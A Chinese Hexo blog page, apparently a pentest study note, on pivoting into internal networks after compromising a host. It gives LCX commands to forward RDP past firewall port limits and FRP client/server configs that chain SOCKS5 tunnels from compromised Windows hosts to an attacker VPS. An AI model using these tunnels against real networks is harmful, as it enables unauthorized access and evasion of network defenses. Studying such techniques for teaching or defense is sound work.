@@ -1,0 +1,537 @@
+
+
+<!DOCTYPE html>
+<html lang="en" color-mode=light>
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>端口转发与内网代理 - Hexo</title>
+  <meta name="apple-mobile-web-app-capable" content="yes" />
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="google" content="notranslate" />
+  <meta name="keywords" content=", 内网学习, 代理, 端口转发">
+  <meta name="description" content="端口转发和代理在拿到一个外网主机的权限之后，是无法访问...">
+  <meta name="author" content="John Doe">
+  <link rel="icon" href="/images/icons/16x16.png" type="image/png" sizes="16x16">
+  <link rel="icon" href="/images/icons/32x32.png" type="image/png" sizes="32x32">
+  <link rel="apple-touch-icon" href="/images/icons/180x180.png" sizes="180x180">
+  <meta rel="mask-icon" href="/images/icons/stun-logo.svg" color="#333333">
+  
+    <meta rel="msapplication-TileImage" content="/images/icons/144x144.png">
+    <meta rel="msapplication-TileColor" content="#000000">
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+
+  
+    
+<link rel="stylesheet" href="https://at.alicdn.com/t/font_1445822_p6ry5n7lrr.css">
+
+  
+
+  
+    
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css">
+
+  
+
+  
+    
+      
+        
+        
+<link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.18.1/styles/xcode.min.css" name="highlight-style" mode="light">
+
+      
+        
+        
+<link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.18.1/styles/solarized-dark.min.css" name="highlight-style" mode="dark">
+
+      
+  
+
+  <script>
+    var CONFIG = window.CONFIG || {};
+    var ZHAOO = window.ZHAOO || {};
+    CONFIG = {
+      isHome: false,
+      fancybox: true,
+      pjax: false,
+      loading: {
+        gif: '/images/theme/loading.gif',
+        lottie: ''
+      },
+      lazyload: {
+        enable: true,
+        only_post: 'false',
+        loading: {
+          gif: '/images/theme/loading.gif',
+          lottie: ''
+        }
+      },
+      donate: {
+        enable: false,
+        alipay: 'https://pic.izhaoo.com/alipay.jpg',
+        wechat: 'https://pic.izhaoo.com/wechat.jpg'
+      },
+      galleries: {
+        enable: true
+      },
+      fab: {
+        enable: true,
+        always_show: false
+      },
+      carrier: {
+        enable: false
+      },
+      daovoice: {
+        enable: false
+      },
+      preview: {
+        background: {
+          default: '',
+          api: ''
+        },
+        motto: {
+          default: '埋下一个梦，待它破土而出。',
+          typing: true,
+          api: 'https://v2.jinrishici.com/one.json',
+          data_contents: '["data","content"]'
+        },
+      },
+      qrcode: {
+        enable: false,
+        type: 'url',
+        image: 'https://pic.izhaoo.com/weapp-code.jpg',
+      },
+      toc: {
+        enable: true
+      },
+      scrollbar: {
+        type: 'default'
+      },
+      notification: {
+        enable: false,
+        delay: 4500,
+        list: '',
+        page_white_list: '',
+        page_black_list: ''
+      },
+      search: {
+        enable: true,
+        path: 'myblog/node_modules/hexo-generator-searchdb/templates/search.xml'
+      }
+    }
+  </script>
+
+  
+
+  
+
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+<body class="lock-screen">
+  <div class="loading" id="loading"></div>
+  
+    
+
+
+  <nav class="navbar">
+    <div class="left">
+      
+        <i class="iconfont iconhome j-navbar-back-home"></i>
+      
+      
+      
+        <i class="iconfont iconmoono" id="color-toggle" color-toggle="light"></i>
+      
+      
+        <i class="iconfont iconsearch j-navbar-search"></i>
+      
+    </div>
+    <div class="center">端口转发与内网代理</div>
+    <div class="right">
+      <i class="iconfont iconmenu j-navbar-menu"></i>
+    </div>
+    
+  </nav>
+
+  
+  
+
+<nav class="menu">
+  <div class="menu-container">
+    <div class="menu-close">
+      <i class="iconfont iconbaseline-close-px"></i>
+    </div>
+    <ul class="menu-content"><li class="menu-item">
+        <a href="/ " class="underline "> 首页</a>
+      </li><li class="menu-item">
+        <a href="/galleries/ " class="underline "> 随拍</a>
+      </li><li class="menu-item">
+        <a href="/archives/ " class="underline "> 归档</a>
+      </li><li class="menu-item">
+        <a href="/tags/ " class="underline "> 标签</a>
+      </li><li class="menu-item">
+        <a href="/categories/ " class="underline "> 分类</a>
+      </li><li class="menu-item">
+        <a href="/about/ " class="underline "> 关于</a>
+      </li></ul>
+    
+      <div class="menu-copyright"><p>Powered by <a target="_blank" href="https://hexo.io">Hexo</a>  |  Theme - <a target="_blank" href="https://github.com/izhaoo/hexo-theme-zhaoo">zhaoo</a></p></div>
+    
+  </div>
+</nav>
+  <main id="main">
+  <div class="article-wrap">
+    <div class="row container">
+      <div class="col-xl-3"></div>
+      <div class="col-xl-6"><article class="article">
+  <div class="wrap">
+    <section class="head">
+  <img   class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/blog-pictures/02.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  draggable="false">
+  <div class="head-mask">
+    <h1 class="head-title">端口转发与内网代理</h1>
+    <div class="head-info">
+      <span class="post-info-item"><i class="iconfont iconcalendar"></i>March 02, 2023</span>
+      
+      <span class="post-info-item"><i class="iconfont iconfont-size"></i>2853</span>
+    </div>
+  </div>
+</section>
+    <section class="main">
+      <section class="content">
+        
+        <h1 id="端口转发和代理"><a href="#端口转发和代理" class="headerlink" title="端口转发和代理"></a>端口转发和代理</h1><p>在拿到一个外网主机的权限之后，是无法访问内网资源的</p>
+<p>此时就可以使用端口转发和代理技术，来进行访问内网资源</p>
+<h2 id="正、反向连接"><a href="#正、反向连接" class="headerlink" title="正、反向连接"></a>正、反向连接</h2><p>正向连接</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">用跳板机主动去连接目标主机<br></code></pre></td></tr></table></figure>
+
+
+
+<p>反向连接</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">让目标机来连接跳板机器<br></code></pre></td></tr></table></figure>
+
+
+
+<p>内网中多数用到的是反向连接</p>
+<p>正向连接容易被目标机器的防火墙拦截，反向连接就不用考虑这种情况</p>
+<h2 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h2><p><font color='red'>端口转发</font></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">把一个端口上收到的数据，转发给另外一个端口<br></code></pre></td></tr></table></figure>
+
+
+
+<p>内网中的防火墙和入侵检测设备，会对一些敏感端口进行检测，发现异样就会强制断开通信</p>
+<p>利用端口转发技术，可以把端口的资源转发到未被检测的端口</p>
+<p><font color='cornflowerblue'>端口映射</font></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">将外网主机收到的请求映射到内网主机上，使内网主机可以对外提供服务<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="SOCKS代理"><a href="#SOCKS代理" class="headerlink" title="SOCKS代理"></a>SOCKS代理</h2><p>socks是一种代理协议</p>
+<p>在1080端口</p>
+<p>有socks4和socks5两个版本</p>
+<p>socks4</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">只支持TCP<br></code></pre></td></tr></table></figure>
+
+<p>socks5</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">socks4协议的升级版本，支持TCP和UDP，还有各种身份验证机制的协议<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h1 id="常见转发与代理工具"><a href="#常见转发与代理工具" class="headerlink" title="常见转发与代理工具"></a>常见转发与代理工具</h1><h2 id="LCX"><a href="#LCX" class="headerlink" title="LCX"></a>LCX</h2><p>古老的端口转发和端口映射工具</p>
+<p>但是不能过杀软+-</p>
+<h3 id="目标机有公网IP"><a href="#目标机有公网IP" class="headerlink" title="目标机有公网IP"></a>目标机有公网IP</h3><p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/BA8CB706F441202601D65FC20014C6F8.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">BA8CB706F441202601D65FC20014C6F8</span></p>
+<p>目标机器有公网ip，可以访问</p>
+<p>防火墙对3389端口进行了限制</p>
+<p>转发到1111端口，需要在目标机器上执行，有些鸡肋</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">lcx</span>.exe -tran <span class="hljs-number">1111</span> <span class="hljs-number">127.0.0.1</span> <span class="hljs-number">3389</span><br></code></pre></td></tr></table></figure>
+
+<p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230204210911755.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image-20230204210911755</span></p>
+<p>然后远程桌面连接</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">rdesktop</span> <span class="hljs-number">192.168.232.136:1111</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>这样就突破了防火墙对3389端口的限制</p>
+<h3 id="端口映射"><a href="#端口映射" class="headerlink" title="端口映射"></a>端口映射</h3><p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/19630FEDDF5CE8489293FA0DD3E23236.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">19630FEDDF5CE8489293FA0DD3E23236</span></p>
+<p>基本模型如图</p>
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gcode">可控的攻击机kali<br><br>公网可以访问的机器wi<span class="hljs-symbol">n10</span><br><br>内网机器wi<span class="hljs-symbol">n7</span><br></code></pre></td></tr></table></figure>
+
+<p>如果现在攻陷了win10，要访问win7，直接访问是不可能的</p>
+<p>现在就需要做一个事情叫<font color='red'>端口映射</font></p>
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">需要将wi<span class="hljs-symbol">n7</span>的端口（比如<span class="hljs-number">1111</span>）映射到wi<span class="hljs-symbol">n10</span>的端口（比如<span class="hljs-number">2222</span>）<br></code></pre></td></tr></table></figure>
+
+
+
+<p>需要在win10上执行如下命令</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment">#将win7的1111端口映射到win10的2222端口</span><br><span class="hljs-attribute">lcx</span>.exe -tran <span class="hljs-number">2222</span> <span class="hljs-number">11.11.11.11</span> <span class="hljs-number">1111</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>连接win10的2222端口，即可访问到win7，<font color='red'>前提是拿到win10的ssh凭据</font></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment">#ssh远程连接</span><br><span class="hljs-attribute">ssh</span> root@<span class="hljs-number">10.10.10.9</span> -p <span class="hljs-number">2222</span><br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="目标机器无公网IP"><a href="#目标机器无公网IP" class="headerlink" title="目标机器无公网IP"></a>目标机器无公网IP</h3><p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/239A4609017AADF848A8289F083E543E.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">239A4609017AADF848A8289F083E543E</span></p>
+<p>模型如上</p>
+<p>一台不在公网的主机win10，已经被我们攻陷了，现在想要远程桌面连接它</p>
+<p>但是不在公网，我们访问不到</p>
+<p>这时就需要我们的VPS</p>
+<p>首先监听VPS的1111端口，将2222端口的信息发给1111端口</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">./lcx</span> <span class="hljs-string">-listen</span> <span class="hljs-number">1111 </span><span class="hljs-number">2222</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>然后在win10主机上执行命令，让win10主机的3389端口转发到VPS的2222端口</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">lcx.exe -slave <span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span> <span class="hljs-number">2222</span> <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> <span class="hljs-number">3389</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>最后连接VPS的1111端口即可访问win10的远程桌面</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">rdesktop <span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span>:<span class="hljs-number">1111</span><br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="FRP"><a href="#FRP" class="headerlink" title="FRP"></a>FRP</h2><p>FRP反向代理</p>
+<p>分为服务端和客户端</p>
+<p>支持TCP、UDP、HTTP、HTTPS等协议</p>
+<p>支持搭建SOCKS5代理</p>
+<p>支持windows系统和linux系统</p>
+<p>模型</p>
+<p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/D84E5D6982751303D7DC0BD1F33499E8.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">D84E5D6982751303D7DC0BD1F33499E8</span></p>
+<h3 id="一级网络代理"><a href="#一级网络代理" class="headerlink" title="一级网络代理"></a>一级网络代理</h3><p>前提是获得了win2008的控制器</p>
+<p>即kali与win2008的连接代理</p>
+<p><font color='red'>VPS作为FRP的服务端</font></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment">#启动服务端</span><br>.<span class="hljs-regexp">/frps -c ./</span>frps.ini<br></code></pre></td></tr></table></figure>
+
+<p>VPS服务端配置</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[common]</span><br><span class="hljs-attr">bind_addr</span> = <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>          <span class="hljs-comment">#服务端绑定的ip地址</span><br><span class="hljs-attr">bind_port</span> = <span class="hljs-number">7000</span>             <span class="hljs-comment">#服务端绑定的端口</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p><font color='red'>win2008作为客户端</font></p>
+<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-comment">#启动客户端</span><br>.<span class="hljs-string">\frpc.exe</span> -c .<span class="hljs-string">\frpc.ini</span><br></code></pre></td></tr></table></figure>
+
+<p>客户端配置</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[common]</span><br><span class="hljs-attr">server_addr</span> = x.x.x.x       <span class="hljs-comment">#服务端地址</span><br><span class="hljs-attr">server_port</span> = <span class="hljs-number">7000</span>          <span class="hljs-comment">#服务端的端口</span><br><br><span class="hljs-section">[socks5]</span><br><span class="hljs-attr">remote_port</span> = <span class="hljs-number">1080</span>          <span class="hljs-comment">#代理使用的端口，会转发到服务端</span><br><span class="hljs-attr">plugin</span> = socks5             <span class="hljs-comment">#代理类型</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>这就成功搭建了VPS与win2008的一个socks5代理</p>
+<p><font color='red'>在kali上使用这个代理</font></p>
+<p>使用proxychains</p>
+<p>配置文件地址</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/etc/</span>proxychains4.conf<br></code></pre></td></tr></table></figure>
+
+<p>在配置文件最后一行加上</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">socks<span class="hljs-number">5</span> <span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span> <span class="hljs-number">1080</span><br></code></pre></td></tr></table></figure>
+
+<p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230204231303622.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image-20230204231303622</span></p>
+<p>在命令之前加上proxychains，就可以使用代理</p>
+<h3 id="二级网络代理"><a href="#二级网络代理" class="headerlink" title="二级网络代理"></a>二级网络代理</h3><p>当我们拿到win2012的权限之后，发现还存在192.168.10.0/24这个网段</p>
+<p>需要搭建一个隧道才能访问，工作区</p>
+<p>首先还是vps启动服务端</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment">#启动服务端</span><br>.<span class="hljs-regexp">/frps -c ./</span>frps.ini<br></code></pre></td></tr></table></figure>
+
+<p>vps服务端配置</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[common]</span><br><span class="hljs-attr">bind_addr</span> = <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>          <span class="hljs-comment">#服务端绑定的ip地址</span><br><span class="hljs-attr">bind_port</span> = <span class="hljs-number">7000</span>             <span class="hljs-comment">#服务端绑定的端口</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>在win2008执行客户端</p>
+<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-comment">#启动客户端</span><br>.<span class="hljs-string">\frpc.exe</span> -c .<span class="hljs-string">\frpc.ini</span><br></code></pre></td></tr></table></figure>
+
+<p>win2008客户端配置</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[common]</span><br><span class="hljs-attr">server_addr</span> = x.x.x.x       <span class="hljs-comment">#服务端地址</span><br><span class="hljs-attr">server_port</span> = <span class="hljs-number">7000</span>          <span class="hljs-comment">#服务端的端口</span><br><br><span class="hljs-section">[socks5_foward]</span><br><span class="hljs-attr">type</span> = tcp<br><span class="hljs-attr">local_ip</span> = <span class="hljs-number">10.10</span>.<span class="hljs-number">10.10</span><br><span class="hljs-attr">local_port</span> = <span class="hljs-number">1111</span><br><span class="hljs-attr">remote_port</span> = <span class="hljs-number">1080</span>          <span class="hljs-comment">#代理使用的端口，会转发到服务端</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>在win2008作为服务端</p>
+<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">.<span class="hljs-string">\frps.exe</span> -c .<span class="hljs-string">\frps.ini</span><br></code></pre></td></tr></table></figure>
+
+<p>服务端配置</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[common]</span><br><span class="hljs-attr">bind_addr</span> = <span class="hljs-number">10.10</span>.<span class="hljs-number">10.10</span>      <span class="hljs-comment">#服务端绑定的ip地址</span><br><span class="hljs-attr">bind_port</span> = <span class="hljs-number">7000</span>             <span class="hljs-comment">#服务端绑定的端口</span><br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<p>在win2012上执行客户端</p>
+<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">.<span class="hljs-string">\frpc.exe</span> -c .<span class="hljs-string">\frpc.ini</span><br></code></pre></td></tr></table></figure>
+
+<p>客户端配置</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[common]</span><br><span class="hljs-attr">server_addr</span> = <span class="hljs-number">10.10</span>.<span class="hljs-number">10.10</span>   <span class="hljs-comment">#服务端地址</span><br><span class="hljs-attr">server_port</span> = <span class="hljs-number">7000</span>          <span class="hljs-comment">#服务端的端口</span><br><br><span class="hljs-section">[socks5]</span><br><span class="hljs-attr">type</span> = tcp<br><span class="hljs-attr">remote_port</span> = <span class="hljs-number">1111</span><br><span class="hljs-attr">plugin</span> = socks5<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="三级网络代理"><a href="#三级网络代理" class="headerlink" title="三级网络代理"></a>三级网络代理</h3><p>同上</p>
+
+      </section>
+      <section class="extra">
+        
+        
+        
+  <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BB%A3%E7%90%86/" rel="tag">代理</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0/" rel="tag">内网学习</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/" rel="tag">端口转发</a></li></ul> 
+
+        
+  <nav class="nav">
+    <a href="/2023/03/02/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/"><i class="iconfont iconleft"></i>数据库提权</a>
+    <a href="/2023/03/02/win%20to%20win%E6%A8%AA%E5%90%91/">win to win横向<i class="iconfont iconright"></i></a>
+  </nav>
+
+      </section>
+      
+        <section class="comments">
+  
+    <div class="btn" id="comments-btn">查看评论</div>
+  
+  
+</section>
+      
+    </section>
+  </div>
+</article></div>
+      <div class="col-xl-3">
+        
+          
+  <aside class="toc-wrap">
+    <h3 class="toc-title">文章目录：</h3>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%92%8C%E4%BB%A3%E7%90%86"><span class="toc-text">端口转发和代理</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A3%E3%80%81%E5%8F%8D%E5%90%91%E8%BF%9E%E6%8E%A5"><span class="toc-text">正、反向连接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-text">端口转发</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SOCKS%E4%BB%A3%E7%90%86"><span class="toc-text">SOCKS代理</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E8%BD%AC%E5%8F%91%E4%B8%8E%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7"><span class="toc-text">常见转发与代理工具</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#LCX"><span class="toc-text">LCX</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E6%A0%87%E6%9C%BA%E6%9C%89%E5%85%AC%E7%BD%91IP"><span class="toc-text">目标机有公网IP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84"><span class="toc-text">端口映射</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E6%A0%87%E6%9C%BA%E5%99%A8%E6%97%A0%E5%85%AC%E7%BD%91IP"><span class="toc-text">目标机器无公网IP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FRP"><span class="toc-text">FRP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E7%BA%A7%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86"><span class="toc-text">一级网络代理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E7%BA%A7%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86"><span class="toc-text">二级网络代理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E7%BA%A7%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86"><span class="toc-text">三级网络代理</span></a></li></ol></li></ol></li></ol>
+  </aside>
+
+        
+      </div>
+    </div>
+  </div>
+</main>
+  
+
+<footer class="footer">
+  <div class="footer-social"><a 
+        href="https://github.com/lcharmy "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#9f7be1'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  icongithub-fill "></i>
+      </a><a 
+        href="mailto:lcharmy@163.com "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color=#FF3B00" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconmail"></i>
+      </a></div>
+  
+    <div class="footer-copyright"><p>Powered by <a target="_blank" href="https://hexo.io">Hexo</a>  |  Theme - <a target="_blank" href="https://github.com/izhaoo/hexo-theme-zhaoo">zhaoo</a></p></div>
+  
+</footer>
+  
+      <div class="fab fab-plus">
+    <i class="iconfont iconplus"></i>
+  </div>
+  
+  
+  
+  <div class="fab fab-up">
+    <i class="iconfont iconcaret-up"></i>
+  </div>
+  
+  
+  
+    
+<script src="/js/color-mode.js"></script>
+
+  
+  
+    <div class="search">
+  <div class="search-container">
+    <div class="search-close">
+      <i class="iconfont iconbaseline-close-px"></i>
+    </div>
+    <div class="search-input-wrapper">
+      <i class="search-input-icon iconfont iconsearch"></i>
+      <input class="search-input" type="search" id="search-input" placeholder="Search..." autofocus autocomplete="off"
+        autocorrect="off" autocapitalize="off">
+    </div>
+    <div class="search-output" id="search-output"></div>
+  </div>
+</div>
+  
+</body>
+
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+
+
+
+
+
+  
+<script src="https://cdn.bootcdn.net/ajax/libs/jquery.lazyload/1.9.1/jquery.lazyload.min.js"></script>
+
+
+
+
+  
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+
+
+
+
+
+
+
+
+<script src="/js/utils.js"></script>
+<script src="/js/script.js"></script>
+
+
+
+
+
+
+
+  <script>
+    (function () {
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+      } else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+</html>
